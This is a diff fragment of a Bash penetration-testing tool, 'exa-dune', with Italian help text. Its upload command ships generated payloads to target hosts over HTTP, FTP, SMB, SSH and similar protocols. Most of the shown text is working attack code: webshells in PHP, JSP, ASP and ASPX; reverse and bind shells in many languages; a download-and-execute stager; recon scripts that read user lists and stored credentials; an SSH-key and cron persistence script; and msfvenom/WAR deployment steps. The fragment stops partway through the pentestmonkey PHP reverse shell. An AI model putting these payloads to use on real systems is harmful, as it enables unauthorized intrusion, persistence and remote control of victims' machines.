+    echo "  corretto (HTTP PUT/POST, FTP, TFTP, SMB, SSH/SCP, TCP raw)."
+    echo "  Con --type genera automaticamente il payload senza fornire un file."
+    echo "  Il protocollo viene rilevato automaticamente dalla porta aperta."
+    echo ""
+    echo -e "${BOLD}Opzioni trasporto:${NC}"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--port PORT"      "Porta target (es. 80, 443, 21). Default: auto-detect"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--proto PROTO"    "Forza protocollo: http|https|ftp|tftp|smb|ssh|tcp"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--remote-path PATH" "Percorso remoto. Default: auto per protocollo"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--method METHOD"  "Metodo HTTP: put|post|webdav (default: auto)"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--user USER"      "Username autenticazione"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--pass PASS"      "Password autenticazione"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--no-verify"      "Ignora errori certificato SSL (HTTPS)"
+    echo ""
+    echo -e "${BOLD}Opzioni script (con --type):${NC}"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--type TIPO"      "Genera payload dal template. Vedi --list-types"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--lhost IP"       "IP listener per reverse shell (obbligatorio con *-revshell)"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--lport PORT"     "Porta listener reverse shell (default: 4444)"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--list-types"     "Mostra tutti i tipi di script disponibili"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--show-type TIPO" "Mostra il codice sorgente del tipo scelto"
+    echo ""
+    echo -e "${BOLD}Opzioni generali:${NC}"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--output DIR"  "Directory output (default: auto)"
+    printf "  ${CYAN}%-22s${NC} %s\n" "--dry-run"     "Mostra i comandi senza eseguirli"
+    echo ""
+    echo -e "${BOLD}Esempi:${NC}"
+    echo "  exa-dune upload 192.168.1.34 shell.php"
+    echo "  exa-dune upload 192.168.1.34 --type php-cmd --port 80"
+    echo "  exa-dune upload 192.168.1.34 --type py-revshell --lhost 192.168.1.100 --proto ftp"
+    echo "  exa-dune upload 192.168.1.34 --type jsp-cmd --port 8080 --method put"
+    echo "  exa-dune upload 192.168.1.34 --type sh-revshell --lhost 192.168.1.100 --lport 9001 --proto ssh --user admin --pass admin"
+    echo "  exa-dune upload 192.168.1.34 --list-types"
+    echo "  exa-dune upload 192.168.1.34 --show-type php-revshell"
+}
+
+# ── Catalogo tipi script ─────────────────────────────────────
+# Formato: "categoria|nome|estensione|descrizione|richiede_lhost"
+_UPLOAD_TYPES=(
+    # ── PHP ─────────────────────────────────────────────────
+    "PHP|php-cmd|php|Webshell: esegue comandi via \$_GET['cmd']|0"
+    "PHP|php-info|php|Fingerprinting: phpinfo() + headers|0"
+    "PHP|php-revshell|php|Reverse shell PHP (lhost+lport richiesti)|1"
+    "PHP|php-upload|php|Secondo stage: form HTML upload file|0"
+    # ── JSP ─────────────────────────────────────────────────
+    "JSP|jsp-cmd|jsp|Webshell JSP: Runtime.exec via parametro cmd|0"
+    "JSP|jsp-revshell|jsp|Reverse shell JSP (lhost+lport richiesti)|1"
+    # ── ASP / ASPX ──────────────────────────────────────────
+    "ASP|asp-cmd|asp|Webshell Classic ASP: Shell.Run via Request|0"
+    "ASP|aspx-cmd|aspx|Webshell ASPX: Process.Start via QueryString|0"
+    # ── Python ──────────────────────────────────────────────
+    "Python|py-revshell|py|Reverse shell Python3 (lhost+lport richiesti)|1"
+    "Python|py-bindshell|py|Bind shell Python3 in ascolto su lport|0"
+    "Python|py-recon|py|Ricognizione sistema: OS, net, utenti, proc|0"
+    "Python|py-download|py|Scarica file HTTP e lo esegue (wget-like)|0"
+    # ── Bash / sh ────────────────────────────────────────────
+    "Bash|sh-revshell|sh|Reverse shell Bash /dev/tcp (lhost+lport richiesti)|1"
+    "Bash|sh-recon|sh|Ricognizione sistema: OS, rete, utenti, cron|0"
+    "Bash|sh-persistence|sh|Persistenza: aggiunge chiave SSH + cron entry|0"
+    # ── Perl ────────────────────────────────────────────────
+    "Perl|pl-revshell|pl|Reverse shell Perl (lhost+lport richiesti)|1"
+    # ── Ruby ────────────────────────────────────────────────
+    "Ruby|rb-revshell|rb|Reverse shell Ruby (lhost+lport richiesti)|1"
+    # ── PowerShell ──────────────────────────────────────────
+    "PowerShell|ps1-revshell|ps1|Reverse shell PowerShell base64-encoded (Windows)|1"
+    "PowerShell|ps1-recon|ps1|Ricognizione Windows: OS, utenti, rete, processi|0"
+    # ── Java / WAR ──────────────────────────────────────────
+    "Java|war-stub|txt|Istruzioni per creare WAR webshell con msfvenom|0"
+    "Java|java-tcp|java|Reverse shell Java via /dev/tcp (PayloadsAllTheThings)|1"
+    # ── PHP (fonti esterne verificate) ──────────────────────
+    "PHP-ext|php-monkey|php|Reverse shell completa: pentestmonkey (proc_open+stream_select+daemon, GPL v2)|1"
+    # ── JSP (fonti esterne verificate) ──────────────────────
+    "JSP-ext|jsp-kit|jsp|Webshell JSP classica: tennc/webshell cmd.jsp (public, 2003)|0"
+    # ── ASP (fonti esterne verificate) ──────────────────────
+    "ASP-ext|aspx-laudanum|aspx|Webshell ASPX con IP whitelist: Laudanum Project (GPL v2)|0"
+    # ── Perl (fonti esterne verificate) ─────────────────────
+    "Perl-ext|pl-monkey|pl|Reverse shell Perl daemon: pentestmonkey (GPL v2) — versione CGI completa|1"
+    # ── Node.js ─────────────────────────────────────────────
+    "Node.js|nodejs-revshell|js|Reverse shell Node.js net.Socket (PayloadsAllTheThings, MIT)|1"
+    # ── Golang ──────────────────────────────────────────────
+    "Golang|go-revshell|go|Reverse shell Go one-liner (PayloadsAllTheThings, MIT)|1"
+    # ── Groovy ──────────────────────────────────────────────
+    "Groovy|groovy-revshell|groovy|Reverse shell Groovy/Jenkins (PayloadsAllTheThings, MIT)|1"
+    # ── Lua ─────────────────────────────────────────────────
+    "Lua|lua-revshell|lua|Reverse shell Lua socket (PayloadsAllTheThings, MIT)|1"
+    # ── Awk ─────────────────────────────────────────────────
+    "Awk|awk-revshell|awk|Reverse shell Awk /inet/tcp — no binari extra (PayloadsAllTheThings, MIT)|1"
+    # ── OpenSSL ─────────────────────────────────────────────
+    "OpenSSL|openssl-revshell|sh|Reverse shell cifrata via openssl s_client + mkfifo (PayloadsAllTheThings, MIT)|1"
+    # ── Socat ───────────────────────────────────────────────
+    "Socat|socat-shell|sh|Shell PTY completa via socat — comandi attacker+victim (InternalAllTheThings)|1"
+    # ── Python (upgrade) ────────────────────────────────────
+    "Python|py-pty|py|Upgrade a shell PTY interattiva con python3 pty.spawn (InternalAllTheThings)|0"
+    # ── Rust ────────────────────────────────────────────────
+    "Rust|rust-revshell|rs|Reverse shell Rust TcpStream + /bin/sh (InternalAllTheThings, MIT)|1"
+    # ── C ───────────────────────────────────────────────────
+    "C|c-revshell|c|Reverse shell C POSIX — compila con gcc e avvia (InternalAllTheThings, MIT)|1"
+    # ── Netcat ──────────────────────────────────────────────
+    "Netcat|nc-revshell|sh|Reverse shell Netcat tradizionale: nc -e /bin/sh (InternalAllTheThings, MIT)|1"
+    "Netcat|nc-openbsd|sh|Reverse shell Netcat OpenBSD: mkfifo + nc (InternalAllTheThings, MIT)|1"
+    "Netcat|nc-busybox|sh|Reverse shell Netcat BusyBox: mknod + nc (InternalAllTheThings, MIT)|1"
+    # ── Telnet ──────────────────────────────────────────────
+    "Telnet|telnet-revshell|sh|Reverse shell Telnet two-listener (InternalAllTheThings, MIT)|1"
+    # ── Bash (extra) ────────────────────────────────────────
+    "Bash|sh-bindshell|sh|Bind shell Bash: mkfifo + nc -l in ascolto su lport|0"
+    # ── PowerShell (extra) ──────────────────────────────────
+    "PowerShell|ps1-bindshell|ps1|Bind shell PowerShell: TcpListener + IEX loop (InternalAllTheThings, MIT)|0"
+    "PowerShell|ps1-download|ps1|Download e IEX da URL controllato (InternalAllTheThings, MIT)|1"
+    # ── Ruby (extra) ────────────────────────────────────────
+    "Ruby|rb-cmd|rb|Webshell Ruby: TCPServer + IO.popen exec loop (InternalAllTheThings, MIT)|0"
+    # ── Dart ────────────────────────────────────────────────
+    "Dart|dart-revshell|dart|Reverse shell Dart: Socket.connect + Process.start (InternalAllTheThings, MIT)|1"
+    # ── ColdFusion ──────────────────────────────────────────
+    "ColdFusion|cfm-cmd|cfm|Webshell ColdFusion con auth token: Laudanum Project (GPL v2)|0"
+)
+
+# ── Stampa catalogo tipi formattato ─────────────────────────
+_upload_list_types() {
+    banner
+    echo -e "${BOLD}Tipi di script disponibili per exa-dune upload --type${NC}"
+    echo ""
+    local prev_cat=""
+    for _entry in "${_UPLOAD_TYPES[@]}"; do
+        IFS='|' read -r _cat _name _ext _desc _need_lh <<< "$_entry"
+        if [[ "$_cat" != "$prev_cat" ]]; then
+            echo -e "\n  ${BOLD}${CYAN}── ${_cat} ──${NC}"
+            printf "  ${BOLD}%-20s %-6s %-4s  %s${NC}\n" "TIPO" "EXT" "LHOST" "DESCRIZIONE"
+            printf "  %-20s %-6s %-4s  %s\n" "────────────────────" "──────" "────" "────────────────────────────────────────"
+            prev_cat="$_cat"
+        fi
+        local _lh_marker="   "
+        [[ "$_need_lh" -eq 1 ]] && _lh_marker="${YELLOW}req${NC}"
+        printf "  ${GREEN}%-20s${NC} .%-5s %-4b  %s\n" "$_name" "$_ext" "$_lh_marker" "$_desc"
+    done
+    echo ""
+    echo -e "  ${BOLD}Legenda:${NC}  ${YELLOW}req${NC} = --lhost obbligatorio"
+    echo ""
+    echo -e "  ${BOLD}Uso rapido:${NC}"
+    echo "    exa-dune upload <TARGET> --type php-cmd --port 80"
+    echo "    exa-dune upload <TARGET> --type py-revshell --lhost <LHOST> --lport 4444"
+    echo "    exa-dune upload <TARGET> --show-type jsp-cmd"
+    echo ""
+}
+
+# ── Genera sorgente script dal tipo ─────────────────────────
+_upload_generate_script() {
+    local stype="$1" lhost="${2:-LHOST}" lport="${3:-4444}"
+
+    case "$stype" in
+
+    # ════════════════════════════════════════════
+    #  PHP
+    # ════════════════════════════════════════════
+    php-cmd)
+        cat <<'SCRIPT'
+<?php
+// exa-dune :: php-cmd webshell
+if(isset($_REQUEST['cmd'])){
+    $cmd = $_REQUEST['cmd'];
+    $out = '';
+    if(function_exists('system')){        ob_start(); system($cmd); $out=ob_get_clean(); }
+    elseif(function_exists('exec')){      exec($cmd,$o); $out=implode("\n",$o); }
+    elseif(function_exists('shell_exec')){ $out=shell_exec($cmd); }
+    elseif(function_exists('passthru')){  ob_start(); passthru($cmd); $out=ob_get_clean(); }
+    header('Content-Type: text/plain');
+    echo $out;
+} else {
+    echo '<form><input name="cmd" style="width:400px" placeholder="comando"/><button>Go</button></form>';
+}
+?>
+SCRIPT
+        ;;
+
+    php-info)
+        cat <<'SCRIPT'
+<?php
+// exa-dune :: php-info fingerprint
+phpinfo();
+echo '<hr/><pre>';
+echo 'SERVER: '.$_SERVER['SERVER_SOFTWARE']."\n";
+echo 'PHP:    '.phpversion()."\n";
+echo 'OS:     '.PHP_OS."\n";
+echo 'USER:   '.get_current_user()."\n";
+echo 'DIR:    '.getcwd()."\n";
+echo '</pre>';
+?>
+SCRIPT
+        ;;
+
+    php-revshell)
+        cat <<SCRIPT
+<?php
+// exa-dune :: php-revshell → ${lhost}:${lport}
+set_time_limit(0);
+\$ip   = '${lhost}';
+\$port = ${lport};
+\$sock = fsockopen(\$ip, \$port);
+if(!\$sock){ die('Connessione fallita'); }
+\$proc = proc_open('/bin/sh -i', [0=>\$sock,1=>\$sock,2=>\$sock], \$pipes);
+proc_close(\$proc);
+fclose(\$sock);
+?>
+SCRIPT
+        ;;
+
+    php-upload)
+        cat <<'SCRIPT'
+<?php
+// exa-dune :: php-upload secondo stage
+if(isset($_FILES['f'])){
+    $dst = __DIR__.'/'.$_FILES['f']['name'];
+    if(move_uploaded_file($_FILES['f']['tmp_name'], $dst)){
+        echo 'Caricato: '.$dst;
+        chmod($dst, 0755);
+    } else { echo 'Errore caricamento'; }
+}
+?>
+<form method="post" enctype="multipart/form-data">
+  <input type="file" name="f"/>
+  <button type="submit">Carica</button>
+</form>
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  JSP
+    # ════════════════════════════════════════════
+    jsp-cmd)
+        cat <<'SCRIPT'
+<%@ page import="java.io.*,java.util.*" %>
+<%-- exa-dune :: jsp-cmd webshell --%>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null && !cmd.isEmpty()){
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    StringBuilder sb = new StringBuilder();
+    String line;
+    while((line = br.readLine()) != null) sb.append(line).append("\n");
+    p.waitFor();
+    response.setContentType("text/plain");
+    out.print(sb.toString());
+} else {
+%>
+<form><input name="cmd" size="60" placeholder="comando"/><button>Esegui</button></form>
+<% } %>
+SCRIPT
+        ;;
+
+    jsp-revshell)
+        cat <<SCRIPT
+<%@ page import="java.io.*,java.net.*" %>
+<%-- exa-dune :: jsp-revshell → ${lhost}:${lport} --%>
+<%
+String host = "${lhost}";
+int    port = ${lport};
+try {
+    Socket s = new Socket(host, port);
+    Process p = Runtime.getRuntime().exec("/bin/sh");
+    InputStream  pi = p.getInputStream(),  ei = p.getErrorStream();
+    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+    InputStream  si = s.getInputStream();
+    new Thread(()-> { try{ byte[]b=new byte[1024];int n;while((n=si.read(b))>0)po.write(b,0,n); }catch(Exception e){} }).start();
+    new Thread(()-> { try{ byte[]b=new byte[1024];int n;while((n=pi.read(b))>0)so.write(b,0,n); }catch(Exception e){} }).start();
+    new Thread(()-> { try{ byte[]b=new byte[1024];int n;while((n=ei.read(b))>0)so.write(b,0,n); }catch(Exception e){} }).start();
+    Thread.sleep(30000);
+} catch(Exception e){ out.println("Errore: "+e.getMessage()); }
+%>
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  ASP / ASPX
+    # ════════════════════════════════════════════
+    asp-cmd)
+        cat <<'SCRIPT'
+<%
+' exa-dune :: asp-cmd webshell
+Dim cmd, sh, out
+cmd = Request("cmd")
+If cmd <> "" Then
+    Set sh  = Server.CreateObject("WScript.Shell")
+    Set out = sh.Exec("cmd.exe /c " & cmd)
+    Response.ContentType = "text/plain"
+    Response.Write out.StdOut.ReadAll()
+    Set sh = Nothing
+Else
+    Response.Write "<form><input name=""cmd"" size=""60""/><button>Go</button></form>"
+End If
+%>
+SCRIPT
+        ;;
+
+    aspx-cmd)
+        cat <<'SCRIPT'
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<!-- exa-dune :: aspx-cmd webshell -->
+<script runat="server">
+protected void Page_Load(object sender, EventArgs e){
+    string cmd = Request.QueryString["cmd"];
+    if(!string.IsNullOrEmpty(cmd)){
+        var psi = new ProcessStartInfo("cmd.exe", "/c "+cmd){
+            RedirectStandardOutput=true, UseShellExecute=false, CreateNoWindow=true };
+        var p = Process.Start(psi);
+        Response.ContentType="text/plain";
+        Response.Write(p.StandardOutput.ReadToEnd());
+    }
+}
+</script>
+<form method="get"><input name="cmd" size="60"/><button>Esegui</button></form>
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Python
+    # ════════════════════════════════════════════
+    py-revshell)
+        cat <<SCRIPT
+#!/usr/bin/env python3
+# exa-dune :: py-revshell → ${lhost}:${lport}
+import socket, subprocess, os
+
+LHOST = '${lhost}'
+LPORT = ${lport}
+
+s = socket.socket()
+s.connect((LHOST, LPORT))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(['/bin/sh', '-i'])
+SCRIPT
+        ;;
+
+    py-bindshell)
+        cat <<SCRIPT
+#!/usr/bin/env python3
+# exa-dune :: py-bindshell — ascolta su 0.0.0.0:${lport}
+import socket, subprocess, os
+
+BIND_PORT = ${lport}
+
+srv = socket.socket()
+srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind(('0.0.0.0', BIND_PORT))
+srv.listen(1)
+print(f'[*] In ascolto su :{BIND_PORT}')
+conn, addr = srv.accept()
+print(f'[+] Connessione da {addr}')
+os.dup2(conn.fileno(), 0)
+os.dup2(conn.fileno(), 1)
+os.dup2(conn.fileno(), 2)
+subprocess.call(['/bin/sh', '-i'])
+SCRIPT
+        ;;
+
+    py-recon)
+        cat <<'SCRIPT'
+#!/usr/bin/env python3
+# exa-dune :: py-recon — ricognizione sistema
+import os, platform, socket, subprocess, getpass, json
+
+def run(cmd):
+    try:
+        return subprocess.check_output(cmd, shell=True,
+               stderr=subprocess.DEVNULL, timeout=5).decode(errors='replace').strip()
+    except Exception:
+        return ''
+
+info = {
+    'hostname':  socket.gethostname(),
+    'os':        platform.platform(),
+    'arch':      platform.machine(),
+    'user':      getpass.getuser(),
+    'uid':       os.getuid(),
+    'cwd':       os.getcwd(),
+    'ip':        run('hostname -I'),
+    'interfaces':run('ip a 2>/dev/null || ifconfig 2>/dev/null'),
+    'routes':    run('ip route 2>/dev/null || netstat -rn 2>/dev/null'),
+    'listening': run('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'),
+    'users':     run('cat /etc/passwd | grep -v nologin | grep -v false'),
+    'sudo':      run('sudo -l 2>/dev/null'),
+    'suid':      run('find / -perm -4000 -type f 2>/dev/null'),
+    'cron':      run('cat /etc/crontab 2>/dev/null; ls /etc/cron.* 2>/dev/null'),
+    'processes': run('ps aux --no-headers 2>/dev/null | head -30'),
+    'env':       dict(os.environ),
+}
+print(json.dumps(info, indent=2, default=str))
+SCRIPT
+        ;;
+
+    py-download)
+        cat <<'SCRIPT'
+#!/usr/bin/env python3
+# exa-dune :: py-download — scarica ed esegue script remoto
+import urllib.request, os, tempfile, subprocess, sys
+
+URL  = sys.argv[1] if len(sys.argv) > 1 else 'http://LHOST/stage2.sh'
+EXEC = sys.argv[2] if len(sys.argv) > 2 else '1'
+
+with tempfile.NamedTemporaryFile(delete=False, suffix='.tmp') as f:
+    fname = f.name
+
+urllib.request.urlretrieve(URL, fname)
+os.chmod(fname, 0o755)
+print(f'[+] Scaricato: {fname}')
+if EXEC == '1':
+    subprocess.call([fname])
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Bash / sh
+    # ════════════════════════════════════════════
+    sh-revshell)
+        cat <<SCRIPT
+#!/bin/bash
+# exa-dune :: sh-revshell → ${lhost}:${lport}
+LHOST="${lhost}"
+LPORT="${lport}"
+
+# Prova bash /dev/tcp
+bash -i >& /dev/tcp/\${LHOST}/\${LPORT} 0>&1 2>/dev/null && exit 0
+
+# Fallback mkfifo
+PIPE=\$(mktemp -u)
+mkfifo "\$PIPE"
+cat "\$PIPE" | /bin/sh -i 2>&1 | nc "\${LHOST}" "\${LPORT}" > "\$PIPE"
+rm -f "\$PIPE"
+SCRIPT
+        ;;
+
+    sh-recon)
+        cat <<'SCRIPT'
+#!/bin/sh
+# exa-dune :: sh-recon — ricognizione sistema (POSIX sh, embedded-friendly)
+SEP="========================================"
+p(){ echo; echo "$SEP"; echo "  $1"; echo "$SEP"; }
+
+p "SISTEMA"
+uname -a 2>/dev/null; cat /etc/os-release 2>/dev/null | head -5
+
+p "UTENTE"
+id; whoami; echo "Home: $HOME"
+
+p "RETE"
+ip a 2>/dev/null || ifconfig 2>/dev/null
+ip route 2>/dev/null || route -n 2>/dev/null
+
+p "PORTE IN ASCOLTO"
+ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
+
+p "UTENTI LOCALI"
+cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false | cut -d: -f1,3,6
+
+p "SUID BINARIES"
+find / -perm -4000 -type f 2>/dev/null | head -20
+
+p "CRONTAB"
+cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null
+
+p "PROCESSI"
+ps aux 2>/dev/null || ps -ef 2>/dev/null | head -30
+
+p "VARIABILI AMBIENTE"
+env 2>/dev/null | grep -iv "pass\|key\|secret\|token" | head -20
+
+p "FILE SENSIBILI"
+find /etc /var/www /opt /home -maxdepth 3 \
+    -name "*.conf" -o -name "*.env" -o -name "*.key" \
+    -o -name "*.password" -o -name "config.php" 2>/dev/null | head -20
+SCRIPT
+        ;;
+
+    sh-persistence)
+        cat <<'SCRIPT'
+#!/bin/sh
+# exa-dune :: sh-persistence — persistenza minima (SSH key + cron)
+# ATTENZIONE: solo per ambienti di test autorizzati
+
+PUB_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB... exa-dune-test"
+CRON_CMD="* * * * * /tmp/.update >/dev/null 2>&1"
+
+# Aggiunge chiave SSH autorizzata
+AUTH="$HOME/.ssh/authorized_keys"
+mkdir -p "$HOME/.ssh" && chmod 700 "$HOME/.ssh"
+grep -qF "$PUB_KEY" "$AUTH" 2>/dev/null || echo "$PUB_KEY" >> "$AUTH"
+chmod 600 "$AUTH"
+echo "[+] Chiave SSH aggiunta: $AUTH"
+
+# Aggiunge entry cron
+(crontab -l 2>/dev/null; echo "$CRON_CMD") | sort -u | crontab -
+echo "[+] Cron entry aggiunta"
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Perl
+    # ════════════════════════════════════════════
+    pl-revshell)
+        cat <<SCRIPT
+#!/usr/bin/perl
+# exa-dune :: pl-revshell → ${lhost}:${lport}
+use strict; use Socket; use POSIX qw(setsid);
+
+my \$LHOST = '${lhost}';
+my \$LPORT = ${lport};
+
+socket(S, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die "socket: \$!";
+connect(S, sockaddr_in(\$LPORT, inet_aton(\$LHOST)))    or die "connect: \$!";
+
+open(STDIN,  '>&S');
+open(STDOUT, '>&S');
+open(STDERR, '>&S');
+
+exec('/bin/sh -i');
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Ruby
+    # ════════════════════════════════════════════
+    rb-revshell)
+        cat <<SCRIPT
+#!/usr/bin/env ruby
+# exa-dune :: rb-revshell → ${lhost}:${lport}
+require 'socket'
+
+LHOST = '${lhost}'
+LPORT = ${lport}
+
+s = TCPSocket.new(LHOST, LPORT)
+\$stdin.reopen(s); \$stdout.reopen(s); \$stderr.reopen(s)
+exec '/bin/sh'
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  PowerShell
+    # ════════════════════════════════════════════
+    ps1-revshell)
+        cat <<SCRIPT
+# exa-dune :: ps1-revshell → ${lhost}:${lport}
+\$LHOST = '${lhost}'
+\$LPORT = ${lport}
+\$client  = New-Object System.Net.Sockets.TCPClient(\$LHOST, \$LPORT)
+\$stream  = \$client.GetStream()
+\$writer  = New-Object System.IO.StreamWriter(\$stream)
+\$reader  = New-Object System.IO.StreamReader(\$stream)
+\$writer.AutoFlush = \$true
+\$buffer  = New-Object System.Byte[] 1024
+\$encoding = New-Object System.Text.ASCIIEncoding
+while(\$client.Connected){
+    \$writer.Write("PS \$(Get-Location)> ")
+    While(\$stream.DataAvailable){
+        \$rawInput = \$reader.ReadLine()
+        try{
+            \$output = Invoke-Expression \$rawInput 2>&1 | Out-String
+            \$writer.Write(\$output)
+        }catch{ \$writer.Write("Errore: \$_\`n") }
+    }
+    Start-Sleep -Milliseconds 100
+}
+\$client.Close()
+SCRIPT
+        ;;
+
+    ps1-recon)
+        cat <<'SCRIPT'
+# exa-dune :: ps1-recon — ricognizione Windows
+Write-Host "=== SISTEMA ===" -ForegroundColor Cyan
+Get-ComputerInfo | Select-Object WindowsProductName,OsVersion,CsName,CsUserName | Format-List
+
+Write-Host "=== UTENTE CORRENTE ===" -ForegroundColor Cyan
+whoami /all
+
+Write-Host "=== RETE ===" -ForegroundColor Cyan
+Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,PrefixLength | Format-Table
+Get-NetRoute | Select-Object DestinationPrefix,NextHop,InterfaceAlias | Format-Table
+
+Write-Host "=== PORTE IN ASCOLTO ===" -ForegroundColor Cyan
+Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess | Sort-Object LocalPort | Format-Table
+
+Write-Host "=== UTENTI LOCALI ===" -ForegroundColor Cyan
+Get-LocalUser | Select-Object Name,Enabled,LastLogon | Format-Table
+
+Write-Host "=== PROCESSI ===" -ForegroundColor Cyan
+Get-Process | Select-Object Name,Id,CPU,WorkingSet | Sort-Object CPU -Descending | Select-Object -First 20 | Format-Table
+
+Write-Host "=== SERVIZI AVVIATI ===" -ForegroundColor Cyan
+Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name,DisplayName | Format-Table
+
+Write-Host "=== CREDENZIALI WINDOWS ===" -ForegroundColor Cyan
+cmdkey /list
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Java / WAR stub
+    # ════════════════════════════════════════════
+    war-stub)
+        cat <<SCRIPT
+# exa-dune :: war-stub — istruzioni per creare WAR webshell (Tomcat/JBoss)
+#
+# Opzione 1 — msfvenom (raccomandato):
+#   msfvenom -p java/jsp_shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f war -o shell.war
+#
+# Opzione 2 — WAR manuale:
+#   mkdir -p webshell/WEB-INF
+#   cat > webshell/cmd.jsp << 'EOF'
+#   <%@ page import="java.io.*" %>
+#   <% String c=request.getParameter("cmd"); Process p=Runtime.getRuntime().exec(c);
+#      BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+#      String line; while((line=br.readLine())!=null) out.println(line); %>
+#   EOF
+#   cat > webshell/WEB-INF/web.xml << 'EOF'
+#   <?xml version="1.0"?><web-app><servlet><servlet-name>cmd</servlet-name>
+#   <jsp-file>/cmd.jsp</jsp-file></servlet></web-app>
+#   EOF
+#   cd webshell && jar cvf ../shell.war . && cd ..
+#
+# Deploy:
+#   curl -u tomcat:tomcat http://${lhost}:8080/manager/text/deploy?path=/shell --upload-file shell.war
+#   curl http://${lhost}:8080/shell/cmd.jsp?cmd=id
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  Java /dev/tcp
+    #  Fonte: swisskyrepo/InternalAllTheThings (MIT)
+    #  Verificato: progetto security research pubblico
+    # ════════════════════════════════════════════
+    java-tcp)
+        cat <<SCRIPT
+// exa-dune :: java-tcp — reverse shell Java via /dev/tcp
+// Fonte: swisskyrepo/InternalAllTheThings (MIT License)
+// Uso: compilare con javac Shell.java && java Shell
+//      oppure incollare in un blocco Runtime.exec()
+import java.io.*;
+import java.net.*;
+
+public class Shell {
+    public static void main(String[] args) throws Exception {
+        String host = "${lhost}";
+        int    port = ${lport};
+        Runtime r = Runtime.getRuntime();
+        Process p = r.exec(new String[]{
+            "/bin/bash", "-c",
+            "exec 5<>/dev/tcp/" + host + "/" + port +
+            ";cat <&5 | while read line; do \$line 2>&5 >&5; done"
+        });
+        p.waitFor();
+    }
+}
+SCRIPT
+        ;;
+
+    # ════════════════════════════════════════════
+    #  PHP reverse shell — pentestmonkey
+    #  Fonte: github.com/pentestmonkey/php-reverse-shell
+    #  Licenza: GPL v2
+    #  Verificato: tool di pentesting legittimo, ampiamente
+    #              usato in CTF e assessment autorizzati
+    # ════════════════════════════════════════════
+    php-monkey)
+        cat <<SCRIPT
+<?php
+// php-reverse-shell — pentestmonkey@pentestmonkey.net
+// Fonte: github.com/pentestmonkey/php-reverse-shell (GPL v2)
+// Solo per usi legali e assessment autorizzati.
+// exa-dune: LHOST=${lhost} LPORT=${lport}
+
+set_time_limit(0);
+\$ip         = '${lhost}';
+\$port       = ${lport};
+\$chunk_size = 1400;
+\$write_a    = null;
+\$error_a    = null;
+\$shell      = 'uname -a; w; id; /bin/sh -i';
+\$daemon     = 0;
+\$debug      = 0;
+
+if (function_exists('pcntl_fork')) {
+    \$pid = pcntl_fork();
+    if (\$pid == -1) { printit("ERROR: Can't fork"); exit(1); }
+    if (\$pid)       { exit(0); }
+    if (posix_setsid() == -1) { printit("Error: Can't setsid()"); exit(1); }
+    \$daemon = 1;
+} else {
+    printit("WARNING: Failed to daemonise. Not fatal.");
+}
+chdir('/');
+umask(0);
+
+\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
+if (!\$sock) { printit("\$errstr (\$errno)"); exit(1); }
+
+\$descriptorspec = [
+    0 => ['pipe', 'r'],
+    1 => ['pipe', 'w'],
+    2 => ['pipe', 'w'],
+];
+\$process = proc_open(\$shell, \$descriptorspec, \$pipes);
+if (!is_resource(\$process)) { printit("ERROR: Can't spawn shell"); exit(1); }
+
+stream_set_blocking(\$pipes[0], 0);
+stream_set_blocking(\$pipes[1], 0);
+stream_set_blocking(\$pipes[2], 0);
+stream_set_blocking(\$sock, 0);
+
+while (1) {
+    if (feof(\$sock))     { printit("ERROR: Shell connection terminated"); break; }
+    if (feof(\$pipes[1])) { printit("ERROR: Shell process terminated");    break; }
+    \$read_a = [\$sock, \$pipes[1], \$pipes[2]];
+    stream_select(\$read_a, \$write_a, \$error_a, null);
+    if (in_array(\$sock, \$read_a)) {
+        \$input = fread(\$sock, \$chunk_size);
+        fwrite(\$pipes[0], \$input);
+    }
+    if (in_array(\$pipes[1], \$read_a)) {
+        \$input = fread(\$pipes[1], \$chunk_size);
+        fwrite(\$sock, \$input);
+    }
+    if (in_array(\$pipes[2], \$read_a)) {
+        \$input = fread(\$pipes[2], \$chunk_size);
+        fwrite(\$sock, \$input);
+    }
+}
+fclose(\$sock);
+fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]);
+proc_close(\$process);
+
